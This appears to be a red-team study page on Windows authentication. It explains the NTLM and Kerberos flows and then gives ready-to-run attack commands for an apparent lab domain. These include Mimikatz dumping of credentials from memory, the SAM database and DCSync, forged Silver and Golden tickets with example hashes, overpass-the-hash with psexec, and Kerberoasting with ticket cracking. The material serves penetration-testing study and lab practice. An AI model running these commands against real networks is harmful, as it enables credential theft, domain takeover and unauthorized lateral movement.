## Windows Authentication

### LM
Was being used by default before windows vista, windows server 2008 (Weak hashing algorithm).

### NT Hash (NTLM)
Currently used for storing passwords at windows systems (Used for pass-the-hash attack).

### LM & NTLM Dump
```
# Dump from memory (Mimikatz)
privilege::debug
sekurlsa::logonpasswords

# Dump from SAM database
reg save HKLM\sam sam
reg save HKLM\system system
lsadump::sam /system:system /sam:sam //Mimikatz

# Dump from Domain Controller
lsadump::dcsync /domain:marvel.local /all /csv //Mimikatz (needs domain admin)
```

### NTLMv1 (Net-NTLMv1)
Not stored locally, used on the fly while authentication.

### NTLMv2 (Net-NTLMv2)
Same as NTLMv1, just with some modification on the encryption algorithm.

### NTLM Authentication Mechanism
- The user enters his username and password.
- The client initiates a negotiation request with the server, that request includes any information about the client capabilities as well as the Dialect or the protocols that the client supports.
- The server picks up the highest dialect and replies through the Negotiation response message then the authentication starts.
- The client then negotiates an authentication session with the server to ask for access.
- The server responds to the request by sending an NTLM challenge.
- The client then encrypts that challenge with his own pre-entered password’s hash (NTLM Hash) and sends his username, challenge, and challenge-response back to the server (Net-NTLM Hash).
- The server tries to encrypt the challenge as well using its own copy of the user’s hash (NTLM Hash) which is stored locally on the server in case of local authentication, or pass the information to the domain controller in case of domain authentication, comparing it to the challenge-response, if equal then the login is successful.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen1.png?raw=true)

Note: To use NTLM authentication instead of Kerberos authentication, access IP addresses instead of Hostnames dir \\10.0.2.100\c$.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen2.png?raw=true)
![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen3.png?raw=true)
![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen4.png?raw=true)

LM / NTLM Hashes are used for Pass-The-Hash attacks, while Net-NTLMv1 / Net-NTLMv2 Hashes are used for NTLM Relay attacks.

Pass-The-Hash will do all the same previous authentication process because of all this process based on the user's hash, not the user's password.

NTLM Relay attack takes place at the Session Setup Request Authentication step.

## Kerberos Authentication

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen5.png?raw=true)

- The client hashes the user’s password, uses that hash to encrypt the current timestamp, and sends the encrypted timestamp to the KDC. The KDC already has a copy of the user’s hash so it uses the hash and tries to decrypt that message to retrieve the timestamp. If the decryption is successful, then the KDC knows that the client used the correct hash and hence proved his identity to that KDC.
- The Authentication service (AS) replies with two messages:
	A. A session key encrypted using the user’s hash, that key will be used for future messages.
	B. TGT (ticket-granting ticket), That TGT contains information regarding the user and his privileges on the domain, This message is encrypted using the hash of the KRBTGT account’s password. That hash is known only to the KDC, so only the KDC can decrypt the TGT.
- The client now has the TGT, he then requests a ticket to access the service he wants, so the client encrypts that request using the session key and sends it to the KDC which will decrypt and validate it. The TGT is also sent in that request.
- After validating the TGT the KDC responds with two messages:
	A. A message specialized for the targeted service, encrypted with the service’s hash which is stored at the KDC, this includes the information in the TGT as well as a session key.
	B. A message for the client containing a session key for further requests between the client and the service he asked to access, which is encrypted using the key retrieved from the AS-REP step.
- The client presents the message (TGS) from the TGS-REP step while connecting to the service along with an encrypted part, called authenticator message, this part includes the user’s name and timestamp which was encrypted and will be decrypted using the service session key. Then compare the username and timestamp from the TGS with the username and timestamp from the authenticator message.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen6.png?raw=true)

### Silver Ticket (Forged TGS)
```
# Silver Ticket
mimikatz # kerberos::golden /user:administrator /domain:marvel.local /sid:S-1-5-21-410602843-3916082903-3170366279 /target:hydra-dc /service:cifs /rc4:86bafceb975cb8237cf2d390faa04074 
mimikatz # kerberos::ptt ticket.kirbi

# CMD
klist
dir \\hydra-dc\c$
```

- user: Username, this can be any user, even an invalid one will work.
- domain: The domain name.
- sid: Domain sid, can be obtained via many methods, whoami /user is one.
- target: Target machine.
- service: The service name, CIFS as am accessing filesharing service.
- rc4: NTLM hash of the target service.

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen7.png?raw=true)
![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen8.png?raw=true)

Note: we can use the target machine hash as the service hash for filesharing service (CIFS).

### Golden Ticket (Forged TGT)
```
# Dump krbtgt hash (run as domain admin)
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:marvel.local /all /csv

# Golden Ticket
mimikatz # kerberos::golden /user:invaliduser /domain:marvel.local /sid:S-1-5-21-410602843-3916082903-3170366279 /rc4:249030b29d08621192b77cb5c8580fad 
mimikatz # kerberos::ptt ticket.kirbi
exit

# CMD
klist
dir \\hydra-dc\c$
```

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen9.png?raw=true)
![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen10.png?raw=true)

In the golden ticket, you’re not restricted to a single service, you got the KRBTGT, you can create your own TGT, so you can create a TGS for any service you want.

### OverPass The Hash
```
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:administrator /domain:marvel.local /ntlm:ead0cc57ddaae50d876b7dd6386fa9c7

# New CMD (use hostname instead of IP to authenticate using Kerberos)
dir //hydra-dc/c$
psexec //hydra-dc cmd
```

### Kerbroasting
```
git clone https://github.com/nidem/kerberoast

# Get all SPNs
.\GetUserSPNs.ps1

# Request ticket for specific service
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "Hydra-DC/SQLService.MARVEL.local:60111" 

# Extract the tickets from memory
mimikatz # kerberos::list /export

# Crack the ticket
python tgsrepcrack.py wordlist.txt Administrator@Hydra-DC~SQLService.MARVEL.LOCAL.kirbi
```
